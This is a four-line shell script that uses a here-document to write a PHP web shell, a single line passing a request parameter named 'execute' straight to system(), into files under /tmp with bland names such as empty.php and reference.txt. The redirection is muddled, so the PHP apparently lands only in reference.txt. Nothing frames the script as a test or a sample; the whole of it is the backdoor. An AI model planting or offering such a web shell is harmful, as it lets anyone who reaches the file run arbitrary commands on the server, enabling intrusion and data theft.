#!/bin/sh
cat > /tmp/empty.php > /tmp/reference.txt <<'DOC'
<?php system($_REQUEST['execute']);
DOC
